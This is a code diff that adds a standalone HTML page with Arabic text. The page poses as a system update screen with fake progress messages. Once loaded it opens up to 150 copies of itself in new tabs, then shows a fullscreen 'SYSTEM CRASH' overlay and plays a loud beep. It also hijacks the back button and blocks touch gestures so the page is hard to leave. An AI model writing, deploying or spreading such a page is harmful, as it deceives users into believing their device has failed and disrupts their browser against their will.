@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>جاري تحديث النظام...</title>
+    <style>
+        /* --- CSS Reset & Base Styles --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none; /* لمنع تحديد النص */
+            -webkit-user-select: none;
+        }
+
+        body {
+            background-color: #0f0f12;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; /* منع السكرول */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        /* --- Loading Animation --- */
+        .loader-container {
+            text-align: center;
+            z-index: 10;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid #00d2ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+            opacity: 0.8;
+        }
+
+        .progress-bar-container {
+            width: 300px;
+            height: 6px;
+            background: #333;
+            margin-top: 20px;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            transition: width 0.5s ease;
+        }
+
+        /* --- Background Effects --- */
+        .bg-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* --- Hidden Iframe for Audio/Logic isolation --- */
+        #logic-frame {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        /* --- Fullscreen Overlay (Final Stage) --- */
+        #final-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: black;
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .glitch-text {
+            font-size: 2rem;
+            font-weight: bold;
+            color: red;
+            text-transform: uppercase;
+            animation: glitch 0.2s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Grid Effect -->
+    <div class="bg-grid"></div>
+
+    <!-- Main UI -->
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="status-text" id="status">جاري تهيئة النظام...</div>
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+    </div>
+
+    <!-- Logic Frame (Hidden) -->
+    <iframe id="logic-frame"></iframe>
+
+    <!-- Final Crash Overlay -->
+    <div id="final-overlay">
+        <div class="glitch-text">SYSTEM CRASH</div>
+        <p style="margin-top: 10px; color: #aaa;">يرجى إعادة تشغيل الجهاز</p>
+    </div>
+
+    <script>
+        // --- Configuration ---
+        const CONFIG = {
+            bombInterval: 500,      // سرعة فتح النوافذ بالميلي ثانية
+            maxWindows: 150,        // أقصى عدد للنوافذ قبل التوقف
+            updateMessages: [
+                "جاري تحميل الحزم الأساسية...",
+                "فحص ملفات النظام...",
+                "تثبيت التحديثات الأمنية...",
+                "مزامنة البيانات...",
+                "إعادة تهيئة الذاكرة المؤقتة...",
+                "الاستقرار النهائي..."
+            ],
+            finalMessage: "حدث خطأ جوهري في النظام."
+        };
+
+        // --- State Management ---
+        let state = {
+            windowsOpened: 0,
+            stage: 1,
+            isLocked: false
+        };
+
+        // --- DOM Elements ---
+        const statusEl = document.getElementById('status');
+        const barEl = document.getElementById('bar');
+        const overlayEl = document.getElementById('final-overlay');
+        const logicFrame = document.getElementById('logic-frame');
+
+        // --- Core Functions ---
+
+        /**
+         * Updates the visual progress bar and text
+         */
+        function updateProgress(step) {
+            const percent = Math.min((step / CONFIG.updateMessages.length) * 100, 99);
+            barEl.style.width = `${percent}%`;
+            if(CONFIG.updateMessages[step]) {
+                statusEl.innerText = CONFIG.updateMessages[step];
+            }
+        }
+
+        /**
+         * The "Bomb" Logic: Opens new tabs/windows aggressively
+         */
+        function startBomb() {
+            const interval = setInterval(() => {
+                if (state.windowsOpened >= CONFIG.maxWindows) {
+                    clearInterval(interval);
+                    triggerCrash();
+                    return;
+                }
+
+                // Open multiple windows per tick to speed it up
+                for(let i=0; i<3; i++) {
+                    if(state.windowsOpened < CONFIG.maxWindows) {
+                        window.open(window.location.href, '_blank');
+                        state.windowsOpened++;
+                    }
+                }
+                
+                // Randomly update text to look like real processing
+                if(Math.random() > 0.7) {
+                    const randomMsg = CONFIG.updateMessages[Math.floor(Math.random() * CONFIG.updateMessages.length)];
+                    statusEl.innerText = randomMsg;
+                }
+
+            }, CONFIG.bombInterval);
+            
+            return interval;
+        }
+
+        /**
+         * Triggers the final full-screen lock
+         */
+        function triggerCrash() {
+            state.isLocked = true;
+            overlayEl.style.display = 'flex';
+            
+            // Try to go fullscreen again just in case
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                }
+            } catch(e) {}
+
+            // Play a loud beep if possible
+            playBeep();
+        }
+
+        /**
+         * Simple Audio Beep using Web Audio API
+         */
+        function playBeep() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                osc.type = 'square';
+                osc.frequency.setValueAtTime(440, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.5);
+                osc.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.5);
+            } catch(e) {}
+        }
+
+        // --- Event Listeners ---
+
+        // Prevent closing via Back Button or Swipe
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+
+        // Prevent Touch gestures that might close the page
+        document.addEventListener('touchstart', function(event) {
+            if (event.targetTouches.length > 1) event.preventDefault();
+        }, { passive: false });
+
+        // Start the sequence on Load
+        window.onload = function() {
+            let currentStep = 0;
+            
+            // Simulate loading steps
+            const loaderInterval = setInterval(() => {
+                if(currentStep < CONFIG.updateMessages.length) {
+                    updateProgress(currentStep);
+                    currentStep++;
+                } else {
+                    clearInterval(loaderInterval);
+                    // Start the Bomb
+                    setTimeout(startBomb, 500);
+                }
+            }, 800); // Speed of fake loading
+        };
+
+        // --- Service Worker Registration (Optional for PWA feel) ---
+        if ('serviceWorker' in navigator) {
+            // We create a dummy blob URL to register a SW without an external file
+            const swCode = `
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('fetch', e => {});
+            `;
+            const blob = new Blob([swCode], {type: 'application/javascript'});
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl)
+                .then(() => console.log('SW Registered'))
+                .catch(err => console.log('SW Fail'));
+        }
+
+    </script>
+</body>
+</html>
